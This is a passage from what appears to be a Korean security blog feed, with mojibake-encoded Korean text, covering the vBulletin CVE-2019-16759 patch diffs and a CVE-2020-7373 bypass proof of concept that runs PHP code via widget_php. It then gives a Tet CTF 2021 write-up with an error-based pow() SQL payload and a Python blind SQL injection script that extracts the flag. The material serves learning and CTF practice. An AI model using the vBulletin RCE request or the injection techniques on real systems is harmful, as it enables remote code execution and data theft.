class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">-));</span><br><span class="line">-Api_InterfaceAbstract::setLight();</span><br><span class="line">+<span class="variable">$templateName</span> = <span class="variable">$routeInfo</span>[<span class="number">2</span>];</span><br><span class="line">+<span class="keyword">if</span> (<span class="variable">$templateName</span> == <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+&#123;</span><br><span class="line">+<span class="variable">$result</span> = <span class="keyword">array</span>(</span><br><span class="line">+<span class="string">&#x27;template&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">+<span class="string">&#x27;css_links&#x27;</span> =&gt; <span class="keyword">array</span>(),</span><br><span class="line">+);</span><br><span class="line">+&#125;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+&#123;</span><br><span class="line">+<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">+<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">+<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">+<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">+<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$templateName</span>,</span><br><span class="line">+<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">+<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">+<span class="comment">// not sending the data to the template</span></span><br><span class="line">+<span class="comment">// render</span></span><br><span class="line">+<span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">+));</span><br><span class="line">+Api_InterfaceAbstract::setLight();</span><br><span class="line">+<span class="variable">$result</span> = vB5_Template::staticRenderAjax(<span class="variable">$templateName</span>, <span class="variable">$serverData</span>);</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$serverData</span>));</span><br><span class="line">+<span class="keyword">$this</span>-&gt;sendAsJson(<span class="variable">$result</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br></pre></td></tr></table></figure><p>ê·¸ë¦¬ê³  ë‘ ë²ˆì§¸ íŒ¨ì¹˜ëŠ” <code>$routeInfo[2]</code>(Template Name)ì˜ ê°’ìœ¼ë¡œ <code>widget_php</code>ê°€ ë“¤ì–´ì˜¤ê²Œ ë˜ë©´ ë¹ˆ í…œí”Œë¦¿ê³¼ CSSë¥¼ ë°˜í™˜í•˜ë„ë¡ í•˜ëŠ” ì¡°ê±´ë¬¸ì„ ì¶”ê°€í•¨ìœ¼ë¡œ 0-dayì— ëŒ€ì‘í•˜ê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.276913797</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.493511575</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-12</span>,<span class="number">6</span> +<span class="number">12</span>,<span class="number">26</span> @@</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">vB5_Template_Runtime</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">+<span class="comment">//This is intended to allow the runtime to know that template it is rendering.</span></span><br><span class="line">+<span class="comment">//It&#x27;s ugly and shouldn&#x27;t be used lightly, but making some features widely</span></span><br><span class="line">+<span class="comment">//available to all templates is uglier.</span></span><br><span class="line">+<span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$templates</span> = <span class="keyword">array</span>();</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">startTemplate</span>(<span class="params"><span class="variable">$template</span></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+array_push(<span class="built_in">self</span>::<span class="variable">$templates</span>, <span class="variable">$template</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">endTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+array_pop(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">currentTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+<span class="keyword">return</span> end(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$units</span> = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;px&#x27;</span>,</span><br><span class="line">@@ <span class="number">-1944</span>,<span class="number">6</span> +<span class="number">1964</span>,<span class="number">21</span> @@</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&#x27;&lt;div style=&quot;border:1px solid red;padding:10px;margin:10px;&quot;&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$timerName</span>) . <span class="string">&#x27;: &#x27;</span> . <span class="variable">$elapsed</span> . <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">evalPhp</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+<span class="comment">//only allow the PHP widget template to do this.  This prevents a malicious user</span></span><br><span class="line">+<span class="comment">//from hacking something into a different template.</span></span><br><span class="line">+<span class="keyword">if</span> (<span class="built_in">self</span>::currentTemplate() != <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+&#123;</span><br><span class="line">+<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">+&#125;</span><br><span class="line">+ob_start();</span><br><span class="line">+<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">+<span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">+ob_end_clean();</span><br><span class="line">+<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">+&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ë˜í•œ evalPhP ë©”ì„œë“œì˜ í˜„ì¬ í…œí”Œë¦¿ì´ widget_phpê°€ ì•„ë‹ˆë©´ Nullì„ ë°˜í™˜í•˜ë„ë¡ í•˜ëŠ” ì¡°ê±´ë¬¸ì„ ì¶”ê°€í•´ì„œ, ë‹¤ë¥¸ í…œí”Œë¦¿ì—ì„œ ì•…ìš©ë  ìš”ì†Œë„ ì œê±°í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. (Line 342 ~ 345)</p><p>ì´ì™€ ê°™ì´ ì´ 2ê³³ì„ íŒ¨ì¹˜í•´ì„œ 0-day ì·¨ì•½ì ì„ ì œê±°í–ˆì§€ë§Œ ì•½ 1ë…„ ì •ë„ê°€ ì§€ë‚˜ê³  í•œ ë³´ì•ˆ ì—°êµ¬ì›ì— ì˜í•´ì„œ ìš°íšŒê°€ ë¼ 0-dayê°€ ë‹¤ì‹œ ë‚˜ì˜¤ê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><hr><h2 id="CVE-2020-7373"><a href="#CVE-2020-7373" class="headerlink" title="CVE-2020-7373"></a><em>CVE-2020-7373</em></h2><p><code>CVE-2020-7373</code>ì€ <code>CVE-2019-16759</code>ë¥¼ íŒ¨ì¹˜í•œ ê²ƒì„ ìš°íšŒí•´ ë‹¤ì‹œ RCE ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±° í•œ 0-day ì…ë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ ë³¸ë¡€ì˜ ìµìŠ¤ ë°©ì‹ê³¼ í¬ê²Œ ë‹¤ë¥¼ ê²Œ ì—†ì§€ë§Œ ë‹¤ë¥´ë‹¤ë©´ í…œí”Œë¦¿ì„ <code>widget_php</code>ê°€ ì•„ë‹Œ <code>widget_tabbedcontainer_tab_panel</code>ì´ë¼ëŠ” í…œí”Œë¦¿ì„ ì´ìš©í•´ì„œ ìµìŠ¤ë¥¼ ì§„í–‰í•˜ì˜€ìŠµë‹ˆë‹¤.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_tabbedcontainer_tab_panel&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1532130449&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.4.4 Alpha 2&quot;</span>&gt;</span>&lt;![CDATA[&#123;vb:set panel_id, &#123;vb:concat &#123;vb:var id_prefix&#125;, &#123;vb:var tab_num&#125;&#125;&#125;</span><br><span class="line">&lt;div id=&quot;&#123;vb:var panel_id&#125;&quot; class=&quot;h-clearfix js-show-on-tabs-create h-hide&quot;&gt;</span><br><span class="line">&lt;vb:comment&gt;</span><br><span class="line">- &#123;vb:var panel_id&#125; </span><br><span class="line">&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;-- &#123;vb:raw subWidget.template&#125;</span><br><span class="line">&lt;/vb:each&gt;</span><br><span class="line">&lt;/vb:comment&gt;</span><br><span class="line"> </span><br><span class="line">&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">&#123;vb:template &#123;vb:raw subWidget.template&#125;, </span><br><span class="line">widgetConfig=&#123;vb:raw subWidget.config&#125;, </span><br><span class="line">widgetinstanceid=&#123;vb:raw subWidget.widgetinstanceid&#125;,</span><br><span class="line">widgettitle=&#123;vb:raw subWidget.title&#125;, </span><br><span class="line">tabbedContainerSubModules=&#123;vb:raw subWidget.tabbedContainerSubModules&#125;,</span><br><span class="line">product=&#123;vb:raw subWidget.product&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/vb:each&gt; </span><br><span class="line">&lt;/div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>widget_tabbedcontainer_tab_panel</code> í…œí”Œë¦¿ì€ ìì‹ í…œí”Œë¦¿ì„ ìƒì„±í•´ì£¼ëŠ” í…œí”Œë¦¿ì´ë¼ê³  í•©ë‹ˆë‹¤. í•˜ë‹¨ì˜ ë³´ë©´ subWidget.templateë¥¼ ì´ìš©í•´ì„œ í…œí”Œë¦¿ ì´ë¦„ì„ ì •í•˜ê³ , {vb:raw subWidget.config}ë¥¼ ì´ìš©í•´ì„œ widgetConfigì— ê°’ì„ ë„£ì–´ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POC : http:&#x2F;&#x2F;141.164.52.207&#x2F;?subWidgets[0][template]&#x3D;widget_php&amp;subWidgets[0][config][code]&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p>ê·¸ëŸ¬ë‹ˆ ìœ„ì™€ ê°™ì´ subWidget.templateì˜ ê°’ìœ¼ë¡œ <code>widget_php</code>, subWidget.configì˜ ê°’ìœ¼ë¡œ <code>code:phpinfo();</code>ë¡œ ë„˜ê²¨ì£¼ë©´ templateì˜ ê°’ì€ <code>widget_php</code>, widgetConfig.codeì˜ ê°’ì€ <code>phpinfo();</code>ê°€ ë  ê²ƒ ì´ê³ , widget_php í…œí”Œë¦¿ì´ ìƒì„±ë˜ë©´ widgetConfig[â€˜codeâ€™]ì˜ ê°’ì€ <code>phpinfo();</code>ì´ë¯€ë¡œ <code>widget_php</code>ì—ì„œ <code>CVE-2019-16759</code>ì™€ ë™ì¼í•˜ê²Œ RCEê°€ íŠ¸ë¦¬ê±° ë˜ê²Œ ë©ë‹ˆë‹¤.</p><hr><h2 id="CVE-2020-7373-Patch"><a href="#CVE-2020-7373-Patch" class="headerlink" title="CVE-2020-7373 Patch"></a>CVE-2020-7373 Patch</h2><p><strong>íŒ¨ì¹˜ ì½”ë“œê°€ ì•ˆ ë³´ì„</strong><br></p><hr>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 0-day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tet CTF 2021 Write Up</title>
      <link href="2021/01/03/2021-01-03-TetCTF/"/>
      <url>2021/01/03/2021-01-03-TetCTF/</url>
      
        <content type="html"><![CDATA[<p><strong>2021ë…„ 1ì›” 1ì¼ ì˜¤ì „ 9ì‹œë¶€í„° Tet CTFë¼ëŠ” ëŒ€íšŒê°€ ì—´ë ¸ìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ ì´ë²ˆ ëŒ€íšŒì—ì„œ ì¶œì œëœ SQL Injectino ë¬¸ì œì˜ í’€ì´ë¥¼ ì‘ì„±í•´ë³´ê² ìŠµë‹ˆë‹¤. ì‚¬ì‹¤ ëŒ€íšŒëŠ” 2ì¼ë™ì•ˆ ì§„í–‰í–ˆëŠ”ë° 1ì‹œê°„ë„ ì•ˆ í–ˆìŒ,, ê²Œì„ í•œë‹¤ê³ ,,</strong></p><hr><p><b><em><span style="color:#21C587">&#35;</span> mysqlimit [100pts]</em></b><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- The Author of this challenge is so kind <span class="keyword">and</span> handsome that he is giving you flag, just need to bypass his god-tier waf <span class="keyword">and</span> grab it &lt;<span class="number">3</span> --&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;dbconnect.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// filter all what i found on internet.... dunno why ï½¡ï¾Ÿï½¥ï¼ˆ&gt;ï¹&lt;ï¼‰ï½¥ï¾Ÿï½¡</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extract|xml|between|count|column|sleep|benchmark|\&lt;|\&gt;|\=/is&#x27;</span> , <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;img src=&quot;https://i.imgur.com/C42ET4u.gif&quot; /&gt;&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// prevent sql injection</span></span><br><span class="line">        <span class="variable">$id</span> = mysqli_real_escape_string(<span class="variable">$conn</span>, <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;select * from flag_here_hihi where id=&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">        <span class="variable">$run_query</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$run_query</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;    </span><br><span class="line">            <span class="comment">// I&#x27;m kidding, just the name of flag, not flag :(</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$run_query</span>-&gt;fetch_array()[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$res</span>; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ì¼ë‹¨ preg_match() í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ìˆ˜ ë§ì€ í‚¤ì›Œë“œë¥¼ í•„í„°ë§í•˜ê³  ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  id ê°’ì´ 1ì¼ë•Œ, 2ì¼ë•Œì˜ ì¶œë ¥ê°’ì´ ë‹¤ë¥´ë¯€ë¡œ Blind Based SQL Injectionì„ ì´ìš©í•´ <code>flag</code>ë¥¼ ë½‘ì•„ì•¼ê² ë‹¤ ìƒê°ì´ ë“¤ì—ˆìŠµë‹ˆë‹¤.</strong><br><br></p><p><strong>í•˜ì§€ë§Œ <code>culumn</code>ì´ë¼ëŠ” í‚¤ì›Œë“œê°€ í•„í„°ë§ì´ ê±¸ë ¤ ìˆì–´ <code>flag</code>ê°€ ë“¤ì–´ìˆëŠ” ì»¬ëŸ¼ì„ Blind Based SQL Injectionì„ ì´ìš©í•´ì„œ ë½‘ì•„ì˜¬ ìˆ˜ ì—†ì„ ê±° ê°™ë‹¤ëŠ” ìƒê°ì´ ë“¤ì—ˆìŠµë‹ˆë‹¤. ì™œëƒí•˜ë©´ <code>information_schema.columns</code>ë¼ëŠ” ë©”íƒ€ í…Œì´ë¸”ì—ì„œ <code>column_name</code>ì„ ì¡°íšŒí•´ì•¼ í•˜ëŠ”ë° í•„í„°ë§ì— ë•Œë¬¸ì— ë¶ˆê°€ëŠ¥í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.</strong><br><br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%206.51.35.png?raw=true"><br><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%206.56.37.png?raw=true"></p><p><strong>ê·¸ëŸ¬ë‹¤ê°€ N1 CTFì—ì„œ <code>exp()</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ Error Based Blind SQL Injectionì„ ì´ìš©í•œ ì ì´ ìˆì–´ì„œ ìœ„ì™€ ê°™ì´ MySQLì˜ <code>exp()</code>í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ <code>Overflow</code>ë¥¼ ì¼ìœ¼ì¼œ ì—ëŸ¬ì— ë‚´ê°€ ì›í•˜ëŠ” ê°’(Column Name)ì„ í¬í•¨ì‹œí‚¤ëŠ” ë°©ì‹ìœ¼ë¡œ í•´ê²°í•˜ë ¤ í–ˆì§€ë§Œ <code>exp()</code> í•¨ìˆ˜ë¥¼ í•„í„°ë§í•˜ê³  ìˆì—ˆìŠµë‹ˆë‹¤. ì•„ë§ˆ ì´ ë°©ë²•ì„ ëª» ì“°ê²Œ ë°©ì§€í•œ ê±° ê°™ìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ ê·¸ëƒ¥ ìƒˆí•´ë‹ˆ ì‰´ë ¤ê³  ì ‘ê³ , ë¡¤ì„ í–ˆì—ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‹¤ ì˜¤ëŠ˜ ì•„ì¹¨ì— ë‹¤ì‹œ í™•ì¸ì„ í•´ë³´ë‹ˆ <code>exp()</code> í•¨ìˆ˜ ëŒ€ì‹  <code>pow()</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ë„ ì˜ ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</strong></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%207.01.29.png?raw=true"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pow(<span class="operator">~</span>(<span class="keyword">select</span> id <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag_here_hihi limit <span class="number">0</span>,<span class="number">1</span>) <span class="keyword">as</span> id),<span class="number">9999</span>)</span><br></pre></td></tr></table></figure><p><strong>ê·¸ë˜ì„œ ìœ„ í˜ì´ë¡œë“œë¥¼ id ê°’ìœ¼ë¡œ ë„˜ê²¨ì£¼ë‹ˆ ì—ëŸ¬ì— ì»¬ëŸ¼ ì´ë¦„ë“¤ì´ í¬í•¨ë˜ì–´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆê³ , <code>t_fl4g_v3lue_su</code>ë¼ëŠ” ì»¬ëŸ¼ì´ ì¡´ì¬í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.  ì´ì œ í•´ë‹¹ ì»¬ëŸ¼ì˜ ê°’ì„ Blind Based SQL Injectionì„ ì´ìš©í•´ì„œ ë½‘ì•„ë‚´ë©´ GG</strong><br><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://45.77.255.164/?id=&quot;</span></span><br><span class="line">flag_len, flag = <span class="number">0</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag_len</span>():</span></span><br><span class="line"><span class="keyword">global</span> flag_len</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">payload = <span class="string">&quot;length(t_fl4g_v3lue_su)in(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">URL = url + payload</span><br><span class="line">res = requests.get(URL)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;handsome_flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">flag_len = i</span><br><span class="line">print(<span class="string">&quot;[+] Flag Length is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag</span>():</span></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, flag_len + <span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>, <span class="number">126</span>):</span><br><span class="line">payload = <span class="string">&quot;ascii(right(left(t_fl4g_v3lue_su,&#123;&#125;),1))in(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">URL = url + payload</span><br><span class="line">res = requests.get(URL)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;handsome_flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">flag += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;Flag is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">print(<span class="string">&quot;[+] Exploitation ...&quot;</span>)</span><br><span class="line">Flag_len()</span><br><span class="line">Flag()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%208.20.53.png?raw=true"></p><p><strong>ìœ„ì™€ ê°™ì´ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ ì‘ì„±í•˜ê³  ëŒë ¤ì£¼ë‹ˆ flagê°€ ì˜ ë‚˜ì˜¤ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</strong><br></p><p><code>FLAG : TetCTF&#123;_W3LlLlLlll_Pl44yYyYyyYY_&lt;3_vina_*100*28904961445554#&#125;</code></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injecion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zer0pts CTF 2020 Write Up</title>
      <link href="2020/12/26/2020-12-26-zer0pts-CTF-2020/"/>
      <url>2020/12/26/2020-12-26-zer0pts-CTF-2020/</url>
      
